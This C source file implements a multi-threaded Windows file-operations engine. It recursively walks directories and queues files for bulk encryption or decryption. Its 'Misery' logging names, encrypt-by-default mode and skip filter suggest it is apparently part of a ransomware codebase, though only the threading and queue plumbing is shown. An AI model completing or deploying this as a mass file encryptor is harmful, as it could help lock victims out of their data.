#include "fops_internal.h"
#include "fops_log.h"
#include <stdlib.h>

extern void FopsEnqueue(FILEOPS_CTX *ctx, const WCHAR *fullPath);
extern void FopsTraverseRecursive(FILEOPS_CTX *ctx, const WCHAR *dir, int depth);
extern DWORD WINAPI FopsWorkerThread(LPVOID lpParam);
extern bool FopsDefaultShouldSkip(const WCHAR *path);

FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
    FILEOPS_CTX *ctx = (FILEOPS_CTX *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILEOPS_CTX));
    if (!ctx) return NULL;

    if (config) {
        ctx->config = *config;
    } else {
        ctx->config.threadCount  = FILEOPS_DEFAULT_THREADS;
        ctx->config.ioBufferSize = FILEOPS_IO_CHUNK;
        ctx->config.flags        = FILEOPS_FLAG_RECURSIVE;
        ctx->config.extension[0] = L'\0';
        ctx->config.pfnShouldSkip = FopsDefaultShouldSkip;
        ctx->config.crypto_ctx   = NULL;
        ctx->config.decryptMode  = false;
    }

    if (!ctx->config.crypto_ctx) {
        MiseryLog(MISERY_LOG_ERROR, "FileOps: crypto_ctx is NULL!");
        HeapFree(GetProcessHeap(), 0, ctx);
        return NULL;
    }

    if (ctx->config.threadCount < 1)   ctx->config.threadCount = 1;
    if (ctx->config.threadCount > 128) ctx->config.threadCount = 128;

    ctx->queueTail = &ctx->queueHead;
    ctx->threadCount = ctx->config.threadCount;

    InitializeCriticalSection(&ctx->statsLock); ctx->statsInitialized = true;
    InitializeCriticalSection(&ctx->queueLock);
    InitializeConditionVariable(&ctx->queueNotEmpty);
    InitializeConditionVariable(&ctx->queueIdle);

    ctx->threads = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(HANDLE) * ctx->threadCount);
    if (!ctx->threads) {
        DeleteCriticalSection(&ctx->statsLock); DeleteCriticalSection(&ctx->queueLock);
        HeapFree(GetProcessHeap(), 0, ctx); return NULL;
    }

    DWORD threadsCreated = 0;
    for (DWORD i = 0; i < ctx->threadCount; i++) {
        HANDLE h = CreateThread(NULL, 0, FopsWorkerThread, ctx, 0, NULL);
        if (h) { ctx->threads[i] = h; threadsCreated++; } else { ctx->threads[i] = NULL; }
    }

    if (threadsCreated == 0) {
        MiseryLog(MISERY_LOG_ERROR, "FileOps: Failed to create worker threads");
        DeleteCriticalSection(&ctx->statsLock); DeleteCriticalSection(&ctx->queueLock);
        HeapFree(GetProcessHeap(), 0, ctx->threads); HeapFree(GetProcessHeap(), 0, ctx); return NULL;
    }

    MiseryLog(MISERY_LOG_INFO, "FileOps: Context ready (%lu threads, mode: %s)",
              threadsCreated, ctx->config.decryptMode ? "DECRYPT" : "ENCRYPT");
    return ctx;
}

void FileOps_TraverseAndQueue(FILEOPS_CTX* ctx, const WCHAR* rootPath) {
    if (!ctx || !rootPath) return;
    FopsTraverseRecursive(ctx, rootPath, 0);
}

void FileOps_WaitForCompletion(FILEOPS_CTX* ctx) {
    if (!ctx) return;
    EnterCriticalSection(&ctx->queueLock);
    while (ctx->queueCount > 0 || ctx->activeWorkers > 0) {
        SleepConditionVariableCS(&ctx->queueIdle, &ctx->queueLock, INFINITE);
    }
    LeaveCriticalSection(&ctx->queueLock);
}

void FileOps_GetStats(FILEOPS_CTX* ctx, FILEOPS_STATS* outStats) {
    if (!ctx || !outStats) return;
    EnterCriticalSection(&ctx->statsLock); *outStats = ctx->stats; LeaveCriticalSection(&ctx->statsLock);
}

void FileOps_DestroyContext(FILEOPS_CTX* ctx) {
    if (!ctx) return;
    EnterCriticalSection(&ctx->queueLock);
    InterlockedExchange(&ctx->shutdownFlag, 1);
    WakeAllConditionVariable(&ctx->queueNotEmpty);
    LeaveCriticalSection(&ctx->queueLock);

    for (DWORD i = 0; i < ctx->threadCount; i++) {
        if (ctx->threads[i]) { WaitForSingleObject(ctx->threads[i], INFINITE); CloseHandle(ctx->threads[i]); }
    }

    struct WorkItem *item = ctx->queueHead;
    while (item) { struct WorkItem *next = item->next; HeapFree(GetProcessHeap(), 0, item); item = next; }

    HeapFree(GetProcessHeap(), 0, ctx->threads);
    DeleteCriticalSection(&ctx->statsLock); DeleteCriticalSection(&ctx->queueLock);
    HeapFree(GetProcessHeap(), 0, ctx);
}

bool FileOps_DefaultShouldSkip(const WCHAR* path) {
    return FopsDefaultShouldSkip(path);
}